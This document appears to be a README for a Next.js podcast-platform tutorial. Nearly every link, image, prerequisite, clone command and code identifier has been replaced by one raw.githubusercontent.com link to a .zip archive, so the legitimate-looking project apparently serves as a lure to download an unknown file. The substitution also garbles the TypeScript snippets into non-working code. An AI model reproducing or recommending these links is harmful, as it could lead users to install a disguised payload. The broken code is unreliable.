<div align="center">
  <br />
    <a href="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" target="_blank">
      <img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" alt="Project Banner">
    </a>
  <br />

  <div>
    <img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" alt="typescript" />
    <img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" alt="nextdotjs" />
    <img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" alt="tailwindcss" />
    <img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" alt="openai" />
  </div>

  <h3 align="center">AI Podcast Platform</h3>

   <div align="center">
     Build this project step by step with our detailed tutorial on <a href="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" target="_blank"><b>JavaScript Mastery</b></a> YouTube. Join the JSM family!
    </div>
</div>

## 📋 <a name="table">Table of Contents</a>

1. 🤖 [Introduction](#introduction)
2. ⚙️ [Tech Stack](#tech-stack)
3. 🔋 [Features](#features)
4. 🤸 [Quick Start](#quick-start)
5. 🕸️ [Snippets (Code to Copy)](#snippets)
6. 🔗 [Assets](#links)
7. 🚀 [More](#more)

## 🚨 Tutorial

This repository contains the code corresponding to an in-depth tutorial available on our YouTube channel, <a href="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" target="_blank"><b>JavaScript Mastery</b></a>. 

If you prefer visual learning, this is the perfect resource for you. Follow our tutorial to learn how to build projects like these step-by-step in a beginner-friendly manner!

<a href="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" target="_blank"><img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" /></a>

## <a name="introduction">🤖 Introduction</a>

A cutting-edge AI SaaS platform that enables users to create, discover, and enjoy podcasts with advanced features like text-to-audio conversion with multi-voice AI, podcast thumbnail Image generation and seamless playback. 

If you're getting started and need assistance or face any bugs, join our active Discord community with over **34k+** members. It's a place where people help each other out.

<a href="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" target="_blank"><img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" /></a>

## <a name="tech-stack">⚙️ Tech Stack</a>

- https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
- TypeScript
- Convex
- OpenAI
- Clerk
- ShadCN
- Tailwind CSS

## <a name="features">🔋 Features</a>

👉 **Robust Authentication**: Secure and reliable user login and registration system.

👉 **Modern Home Page**: Showcases trending podcasts with a sticky podcast player for continuous listening.

👉 **Discover Podcasts Page**: Dedicated page for users to explore new and popular podcasts.

👉 **Fully Functional Search**: Allows users to find podcasts easily using various search criteria.

👉 **Create Podcast Page**: Enables podcast creation with text-to-audio conversion, AI image generation, and previews.

👉 **Multi Voice AI Functionality**: Supports multiple AI-generated voices for dynamic podcast creation.

👉 **Profile Page**: View all created podcasts with options to delete them.

👉 **Podcast Details Page**: Displays detailed information about each podcast, including creator details, number of listeners, and transcript.

👉 **Podcast Player**: Features backward/forward controls, as well as mute/unmute functionality for a seamless listening experience.

👉 **Responsive Design**: Fully functional and visually appealing across all devices and screen sizes.

and many more, including code architecture and reusability 

## <a name="quick-start">🤸 Quick Start</a>

Follow these steps to set up the project locally on your machine.

**Prerequisites**

Make sure you have the following installed on your machine:

- [Git](https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip)
- [https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip](https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip)
- [npm](https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) (Node Package Manager)

**Cloning the Repository**

```bash
git clone https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
cd jsm_podcastr
```

**Installation**

Install the project dependencies using npm:

```bash
npm install
```

**Set Up Environment Variables**

Create a new file named `.env` in the root of your project and add the following content:

```env
CONVEX_DEPLOYMENT=
NEXT_PUBLIC_CONVEX_URL=
NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY=
CLERK_SECRET_KEY=
NEXT_PUBLIC_CLERK_SIGN_IN_URL='/sign-in'
NEXT_PUBLIC_CLERK_SIGN_UP_URL='/sign-up'
```

Replace the placeholder values with your actual Convex & Clerk credentials. You can obtain these credentials by signing up on the [Convex](https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) and [Clerk](https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) websites.

**Running the Project**

```bash
npm run dev
```

Open [http://localhost:3000](http://localhost:3000) in your browser to view the project.

## <a name="snippets">🕸️ Snippets</a>

<details>
<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>

```css
@tailwind base;
@tailwind components;
@tailwind utilities;

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

html {
  background-color: #101114;
}

@layer utilities {
  .input-class {
    @apply text-16 placeholder:text-16 bg-black-1 rounded-[6px] placeholder:text-gray-1 border-none text-gray-1;
  }
  .podcast_grid {
    @apply grid grid-cols-1 gap-5 sm:grid-cols-2 lg:grid-cols-3 2xl:grid-cols-4;
  }
  .right_sidebar {
    @apply sticky right-0 top-0 flex w-[310px] flex-col overflow-y-hidden border-none bg-black-1 px-[30px] pt-8 max-xl:hidden;
  }
  .left_sidebar {
    @apply sticky left-0 top-0 flex w-fit flex-col  justify-between  border-none  bg-black-1 pt-8 text-white-1 max-md:hidden lg:w-[270px] lg:pl-8;
  }
  .generate_thumbnail {
    @apply mt-[30px] flex w-full max-w-[520px] flex-col justify-between gap-2 rounded-lg border border-black-6 bg-black-1 px-2.5 py-2 md:flex-row md:gap-0;
  }
  .image_div {
    @apply flex-center mt-5 h-[142px] w-full cursor-pointer flex-col gap-3 rounded-xl border-[3.2px] border-dashed border-black-6 bg-black-1;
  }
  .carousel_box {
    @apply relative flex h-fit aspect-square w-full flex-none cursor-pointer flex-col justify-end rounded-xl border-none;
  }
  .button_bold-16 {
    @apply text-[16px] font-bold text-white-1 transition-all duration-500;
  }
  .flex-center {
    @apply flex items-center justify-center;
  }
  .text-12 {
    @apply text-[12px] leading-normal;
  }
  .text-14 {
    @apply text-[14px] leading-normal;
  }
  .text-16 {
    @apply text-[16px] leading-normal;
  }
  .text-18 {
    @apply text-[18px] leading-normal;
  }
  .text-20 {
    @apply text-[20px] leading-normal;
  }
  .text-24 {
    @apply text-[24px] leading-normal;
  }
  .text-32 {
    @apply text-[32px] leading-normal;
  }
}

/* ===== custom classes ===== */

.custom-scrollbar::-webkit-scrollbar {
  width: 3px;
  height: 3px;
  border-radius: 2px;
}

.custom-scrollbar::-webkit-scrollbar-track {
  background: #15171c;
}

.custom-scrollbar::-webkit-scrollbar-thumb {
  background: #222429;
  border-radius: 50px;
}

.custom-scrollbar::-webkit-scrollbar-thumb:hover {
  background: #555;
}
/* Hide scrollbar for Chrome, Safari and Opera */
.no-scrollbar::-webkit-scrollbar {
  display: none;
}

/* Hide scrollbar for IE, Edge and Firefox */
.no-scrollbar {
  -ms-overflow-style: none; /* IE and Edge */
  scrollbar-width: none; /* Firefox */
}
.glassmorphism {
  background: rgba(255, 255, 255, 0.25);
  backdrop-filter: blur(4px);
  -webkit-backdrop-filter: blur(4px);
}
.glassmorphism-auth {
  background: rgba(6, 3, 3, 0.711);
  backdrop-filter: blur(4px);
  -webkit-backdrop-filter: blur(4px);
}
.glassmorphism-black {
  background: rgba(18, 18, 18, 0.64);
  backdrop-filter: blur(37px);
  -webkit-backdrop-filter: blur(37px);
}

/* ======= clerk overrides ======== */
.cl-socialButtonsIconButton {
  border: 2px solid #222429;
}
.cl-button {
  color: white;
}
.cl-socialButtonsProviderIcon__github {
  filter: invert(1);
}
.cl-internal-b3fm6y {
  background: #f97535;
}
.cl-formButtonPrimary {
  background: #f97535;
}
.cl-footerActionLink {
  color: #f97535;
}
.cl-headerSubtitle {
  color: #c5d0e6;
}
.cl-logoImage {
  width: 10rem;
  height: 3rem;
}
.cl-internal-4a7e9l {
  color: white;
}

.cl-userButtonPopoverActionButtonIcon {
  color: white;
}
.cl-internal-wkkub3 {
  color: #f97535;
}
```

</details>

<details>
<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>

```typescript
import type { Config } from "tailwindcss";

const config = {
  darkMode: ["class"],
  content: [
    "./pages/**/*.{ts,tsx}",
    "./components/**/*.{ts,tsx}",
    "./app/**/*.{ts,tsx}",
    "./src/**/*.{ts,tsx}",
  ],
  prefix: "",
  theme: {
    container: {
      center: true,
      padding: "2rem",
      screens: {
        "2xl": "1400px",
      },
    },
    extend: {
      colors: {
        white: {
          1: "#FFFFFF",
          2: "rgba(255, 255, 255, 0.72)",
          3: "rgba(255, 255, 255, 0.4)",
          4: "rgba(255, 255, 255, 0.64)",
          5: "rgba(255, 255, 255, 0.80)",
        },
        black: {
          1: "#15171C",
          2: "#222429",
          3: "#101114",
          4: "#252525",
          5: "#2E3036",
          6: "#24272C",
        },
        orange: {
          1: "#F97535",
        },
        gray: {
          1: "#71788B",
        },
      },
      backgroundImage: {
        "nav-focus":
          "linear-gradient(270deg, rgba(255, 255, 255, 0.06) 0%, rgba(255, 255, 255, 0.00) 100%)",
      },
      keyframes: {
        "accordion-down": {
          from: { height: "0" },
          to: { height: "var(--radix-accordion-content-height)" },
        },
        "accordion-up": {
          from: { height: "var(--radix-accordion-content-height)" },
          to: { height: "0" },
        },
      },
      animation: {
        "accordion-down": "accordion-down 0.2s ease-out",
        "accordion-up": "accordion-up 0.2s ease-out",
      },
    },
  },
  plugins: [require("tailwindcss-animate")],
} satisfies Config;

export default config;
```

</details>

<details>
<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>

```typescript
export const sidebarLinks = [
  {
    imgURL: "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
    route: "/",
    label: "Home",
  },
  {
    imgURL: "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
    route: "/discover",
    label: "Discover",
  },
  {
    imgURL: "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
    route: "/create-podcast",
    label: "Create Podcast",
  },
];

export const voiceDetails = [
  {
    id: 1,
    name: "alloy",
  },
  {
    id: 2,
    name: "echo",
  },
  {
    id: 3,
    name: "fable",
  },
  {
    id: 4,
    name: "onyx",
  },
  {
    id: 5,
    name: "nova",
  },
  {
    id: 6,
    name: "shimmer",
  },
];

export const podcastData = [
  {
    id: 1,
    title: "The Joe Rogan Experience",
    description: "A long form, in-depth conversation",
    imgURL:
      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
  },
  {
    id: 2,
    title: "The Futur",
    description: "This is how the news should sound",
    imgURL:
      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
  },
  {
    id: 3,
    title: "Waveform",
    description: "Join Michelle Obama in conversation",
    imgURL:
      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
  },
  {
    id: 4,
    title: "The Tech Talks Daily Podcast",
    description: "This is how the news should sound",
    imgURL:
      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
  },
  {
    id: 5,
    title: "GaryVee Audio Experience",
    description: "A long form, in-depth conversation",
    imgURL:
      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
  },
  {
    id: 6,
    title: "Syntax ",
    description: "Join Michelle Obama in conversation",
    imgURL:
      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
  },
  {
    id: 7,
    title: "IMPAULSIVE",
    description: "A long form, in-depth conversation",
    imgURL:
      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
  },
  {
    id: 8,
    title: "Ted Tech",
    description: "This is how the news should sound",
    imgURL:
      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
  },
];
```

</details>

<details>
<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>

```typescript
// ===== reference links =====
// https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip (open the link and choose for clerk than you will get the github link mentioned below)
// https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip

import type { WebhookEvent } from "@clerk/nextjs/server";
import { httpRouter } from "convex/server";
import { Webhook } from "svix";

import { internal } from "./_generated/api";
import { httpAction } from "./_generated/server";

const handleClerkWebhook = httpAction(async (ctx, request) => {
  const event = await validateRequest(request);
  if (!event) {
    return new Response("Invalid request", { status: 400 });
  }
  switch (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) {
    case "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip":
      await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip, {
        clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
        email: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip[0].email_address,
        imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
        name: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip as string,
      });
      break;
    case "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip":
      await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip, {
        clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
        imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
        email: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip[0].email_address,
      });
      break;
    case "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip":
      await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip, {
        clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip as string,
      });
      break;
  }
  return new Response(null, {
    status: 200,
  });
});

const http = httpRouter();

https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip({
  path: "/clerk",
  method: "POST",
  handler: handleClerkWebhook,
});

const validateRequest = async (
  req: Request
): Promise<WebhookEvent | undefined> => {
  // key note : add the webhook secret variable to the environment variables field in convex dashboard setting
  const webhookSecret = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip!;
  if (!webhookSecret) {
    throw new Error("CLERK_WEBHOOK_SECRET is not defined");
  }
  const payloadString = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip();
  const headerPayload = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip;
  const svixHeaders = {
    "svix-id": https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("svix-id")!,
    "svix-timestamp": https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("svix-timestamp")!,
    "svix-signature": https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("svix-signature")!,
  };
  const wh = new Webhook(webhookSecret);
  const event = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(payloadString, svixHeaders);
  return event as unknown as WebhookEvent;
};

export default http;
```

</details>

<details>
<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>

```typescript
import { ConvexError, v } from "convex/values";

import { internalMutation, query } from "./_generated/server";

export const getUserById = query({
  args: { clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip() },
  handler: async (ctx, args) => {
    const user = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
      .query("users")
      .filter((q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("clerkId"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
      .unique();

    if (!user) {
      throw new ConvexError("User not found");
    }

    return user;
  },
});

// this query is used to get the top user by podcast count. first the podcast is sorted by views and then the user is sorted by total podcasts, so the user with the most podcasts will be at the top.
export const getTopUserByPodcastCount = query({
  args: {},
  handler: async (ctx, args) => {
    const user = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("users").collect();

    const userData = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(async (u) => {
        const podcasts = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
          .query("podcasts")
          .filter((q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("authorId"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
          .collect();

        const sortedPodcasts = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip((a, b) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip - https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);

        return {
          ...u,
          totalPodcasts: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
          podcast: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip((p) => ({
            podcastTitle: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
            pocastId: p._id,
          })),
        };
      })
    );

    return https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip((a, b) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip - https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
  },
});

export const createUser = internalMutation({
  args: {
    clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
    email: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
    imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
    name: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
  },
  handler: async (ctx, args) => {
    await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("users", {
      clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
      email: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
      imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
      name: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
    });
  },
});

export const updateUser = internalMutation({
  args: {
    clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
    imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
    email: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
  },
  async handler(ctx, args) {
    const user = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
      .query("users")
      .filter((q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("clerkId"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
      .unique();

    if (!user) {
      throw new ConvexError("User not found");
    }

    await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(user._id, {
      imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
      email: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
    });

    const podcast = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
      .query("podcasts")
      .filter((q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("authorId"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
      .collect();

    await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(
      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(async (p) => {
        await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(p._id, {
          authorImageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
        });
      })
    );
  },
});

export const deleteUser = internalMutation({
  args: { clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip() },
  async handler(ctx, args) {
    const user = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
      .query("users")
      .filter((q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("clerkId"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
      .unique();

    if (!user) {
      throw new ConvexError("User not found");
    }

    await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(user._id);
  },
});
```

</details>

<details>
<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>

```typescript
/* eslint-disable no-unused-vars */

import { Dispatch, SetStateAction } from "react";

import { Id } from "@/convex/_generated/dataModel";

export interface EmptyStateProps {
  title: string;
  search?: boolean;
  buttonText?: string;
  buttonLink?: string;
}

export interface TopPodcastersProps {
  _id: Id<"users">;
  _creationTime: number;
  email: string;
  imageUrl: string;
  clerkId: string;
  name: string;
  podcast: {
    podcastTitle: string;
    pocastId: Id<"podcasts">;
  }[];
  totalPodcasts: number;
}

export interface PodcastProps {
  _id: Id<"podcasts">;
  _creationTime: number;
  audioStorageId: Id<"_storage"> | null;
  user: Id<"users">;
  podcastTitle: string;
  podcastDescription: string;
  audioUrl: string | null;
  imageUrl: string | null;
  imageStorageId: Id<"_storage"> | null;
  author: string;
  authorId: string;
  authorImageUrl: string;
  voicePrompt: string;
  imagePrompt: string | null;
  voiceType: string;
  audioDuration: number;
  views: number;
}

export interface ProfilePodcastProps {
  podcasts: PodcastProps[];
  listeners: number;
}

export type VoiceType =
  | "alloy"
  | "echo"
  | "fable"
  | "onyx"
  | "nova"
  | "shimmer";

export interface GeneratePodcastProps {
  voiceType: VoiceType;
  setAudio: Dispatch<SetStateAction<string>>;
  audio: string;
  setAudioStorageId: Dispatch<SetStateAction<Id<"_storage"> | null>>;
  voicePrompt: string;
  setVoicePrompt: Dispatch<SetStateAction<string>>;
  setAudioDuration: Dispatch<SetStateAction<number>>;
}

export interface GenerateThumbnailProps {
  setImage: Dispatch<SetStateAction<string>>;
  setImageStorageId: Dispatch<SetStateAction<Id<"_storage"> | null>>;
  image: string;
  imagePrompt: string;
  setImagePrompt: Dispatch<SetStateAction<string>>;
}

export interface LatestPodcastCardProps {
  imgUrl: string;
  title: string;
  duration: string;
  index: number;
  audioUrl: string;
  author: string;
  views: number;
  podcastId: Id<"podcasts">;
}

export interface PodcastDetailPlayerProps {
  audioUrl: string;
  podcastTitle: string;
  author: string;
  isOwner: boolean;
  imageUrl: string;
  podcastId: Id<"podcasts">;
  imageStorageId: Id<"_storage">;
  audioStorageId: Id<"_storage">;
  authorImageUrl: string;
  authorId: string;
}

export interface AudioProps {
  title: string;
  audioUrl: string;
  author: string;
  imageUrl: string;
  podcastId: string;
}

export interface AudioContextType {
  audio: AudioProps | undefined;
  setAudio: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip<https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip<AudioProps | undefined>>;
}

export interface PodcastCardProps {
  imgUrl: string;
  title: string;
  description: string;
  podcastId: Id<"podcasts">;
}

export interface CarouselProps {
  fansLikeDetail: TopPodcastersProps[];
}

export interface ProfileCardProps {
  podcastData: ProfilePodcastProps;
  imageUrl: string;
  userFirstName: string;
}

export type UseDotButtonType = {
  selectedIndex: number;
  scrollSnaps: number[];
  onDotButtonClick: (index: number) => void;
};
```

</details>

<details>
<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>

```typescript
import { ConvexError, v } from "convex/values";

import { mutation, query } from "./_generated/server";

// create podcast mutation
export const createPodcast = mutation({
  args: {
    audioStorageId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("_storage"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip()),
    podcastTitle: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
    podcastDescription: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
    audioUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
    imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
    imageStorageId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("_storage"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip()),
    voicePrompt: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
    imagePrompt: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
    voiceType: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
    views: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
    audioDuration: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
  },
  handler: async (ctx, args) => {
    const identity = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip();

    if (!identity) {
      throw new ConvexError("User not authenticated");
    }

    const user = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
      .query("users")
      .filter((q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("email"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
      .collect();

    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip === 0) {
      throw new ConvexError("User not found");
    }

    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts", {
